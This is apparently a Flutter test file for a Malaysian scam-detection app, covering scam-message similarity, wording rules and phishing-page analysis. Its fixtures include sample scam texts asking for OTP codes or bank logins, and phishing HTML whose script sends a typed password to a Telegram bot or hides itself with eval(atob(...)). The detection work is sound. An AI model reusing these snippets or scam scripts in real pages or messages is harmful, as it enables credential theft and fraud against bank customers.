import 'package:flutter_test/flutter_test.dart';
import 'package:kantoi/engine/cues.dart';
import 'package:kantoi/engine/forensics/landing_page.dart';
import 'package:kantoi/engine/forensics/scam_similarity.dart';
import 'package:kantoi/engine/forensics/text_forensics.dart';
import 'package:kantoi/engine/models.dart';

TextForensics _analyze(String text) => analyzeText(text,
    existing: detectCues(text), log: (tool, action, {sentOffDevice = false}) => LogStep(tool: tool, action: action));

bool _has(List<Finding> f, String title) => f.any((x) => x.title == title);

void main() {
  group('scam similarity', () {
    test('new wording of a known script matches, with its type', () {
      final s = scamSimilarity('Make 4% every day with our automated trading robot. Capital guaranteed, start with RM300 only');
      expect(s.matches, isTrue, reason: 'scam ${s.scam}, genuine ${s.legit}');
      expect(s.scamType, 'Investment scam');
      expect(scamSimilarityFinding('Make 4% every day with our automated trading robot. Capital guaranteed, start with RM300 only')!.category,
          CueCategory.scamPattern);
    });

    test('Manglish spelling still matches', () {
      final s = scamSimilarity('sori bro tersilap taip no, ada kod 6 digit masuk fon u, boleh ss hantar kat i balik');
      expect(s.matches, isTrue, reason: 'scam ${s.scam}, genuine ${s.legit}');
      expect(s.scamType, 'Account takeover');
    });

    test('everyday messages about codes and money stay quiet', () {
      for (final t in [
        'Your TAC is 902211 for a transfer of RM50.00. Valid for 2 minutes. Never share your TAC.',
        'Bro can bank in RM10 for the movie tickets? I already bought for both of us',
        'Your parcel is out for delivery today. No payment is needed.',
        'Mama, I reached school already. Will call later.',
      ]) {
        expect(scamSimilarity(t).matches, isFalse, reason: t);
      }
    });

    test('normalising hides digits and links', () {
      expect(simNormalise('Pay RM2.50 at https://x.top/pay NOW!'), 'pay rm0 00 at url now');
    });
  });

  group('new wording rules', () {
    test('trading robots and percent-a-day returns', () {
      final f = detectCues('Our AI trading bot gives 2.5% per day, withdraw anytime');
      expect(_has(f, 'Trading robot pitch'), isTrue);
      expect(_has(f, 'Unrealistic returns'), isTrue);
    });

    test('task job pay ranges and same-day pay', () {
      expect(_has(detectCues('Kerja mudah, komisen RM50 - RM200 sehari, gaji masuk hari yang sama'), 'Easy-money job offer'), isTrue);
      expect(_has(detectCues('Just follow shops on TikTok and earn commission for each task'), 'Paid to like or review'), isTrue);
    });

    test('mule accounts and banking logins', () {
      expect(_has(detectCues('We rent your unused bank account for RM600 a week'), 'Wants to use your bank account'), isTrue);
      expect(_has(detectCues('Give us your online banking username and password to receive the payment'), 'Asks for your banking login'), isTrue);
      expect(_has(detectCues('Never share your user ID and password with anyone.'), 'Asks for your banking login'), isFalse);
    });

    test('pay first, cut-off threats and expiring points', () {
      expect(_has(detectCues('Loan approved. Pay the processing fee first to release it.'), 'Pay a fee first'), isTrue);
      expect(_has(detectCues('Your line will be terminated today due to unpaid charges'), 'Threatens to cut you off'), isTrue);
      expect(_has(detectCues('Your 5,000 points expire tonight! Redeem now at rewards-my.top'), 'Points expiring today'), isTrue);
      expect(_has(detectCues('You earned 50 points. Points expire in 12 months.'), 'Points expiring today'), isFalse);
    });
  });

  group('spaced-out letters', () {
    test('O T P is read as OTP', () {
      expect(collapseSpacedLetters('send me the O T P now'), 'send me the OTP now');
      final r = _analyze('Hi, please send me the O T P that you got just now');
      expect(_has(r.findings, 'Spaced-out letters'), isTrue);
      expect(r.findings.any((f) => f.title == 'Wants your code' && f.tool == 'Obfuscation check'), isTrue);
    });

    test('ordinary single letters are left alone', () {
      expect(spacedLetterFindings('Plan A, B or C? Let me know'), isEmpty);
    });
  });

  group('landing page reading', () {
    final evil = Uri.parse('https://secure-m2u-login.top/');

    test('a script posting to a Telegram bot', () {
      const html = '<html><title>Login</title><form><input type="password" name="pw"></form>'
          '<script>fetch("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text="+pw)</script></html>';
      final r = analyzeLandingHtml(html, evil);
      expect(r.exfiltration, 'a Telegram bot');
      expect(r.findings.any((f) => f.title == 'Sends what you type to a Telegram bot' && f.weight == 26), isTrue);
    });

    test('logos loaded from the real bank site', () {
      const html = '<html><title>Welcome</title><img src="https://www.maybank2u.com.my/iwov-resources/images/logo.png">'
          '<p>Hello</p></html>';
      final r = analyzeLandingHtml(html, evil);
      expect(r.hotlinkedFrom, {'Maybank'});
      expect(_has(r.findings, "Borrows Maybank's logos from the real site"), isTrue);
    });

    test('blocked right-click and scrambled script', () {
      const html = '<body oncontextmenu="return false"><script>eval(atob("ZG9jdW1lbnQud3JpdGUoMSk="))</script></body>';
      final r = analyzeLandingHtml(html, evil);
      expect(r.evasions, containsAll(['blocks right-click or developer tools', 'scrambled script']));
      expect(_has(r.findings, 'Hides how the page works'), isTrue);
    });

    test('the official site is not flagged for its own logos', () {
      const html = '<img src="https://www.maybank2u.com.my/logo.png"><body oncontextmenu="return false">';
      final r = analyzeLandingHtml(html, Uri.parse('https://www.maybank2u.com.my/home'));
      expect(r.findings, isEmpty);
    });

    test('visible text drops comments and decodes entities', () {
      expect(visibleText('<p>J&amp;T&nbsp;Express <!-- hidden --> &#82;M5</p><script>x()</script>'), 'J&T Express RM5');
    });
  });
}
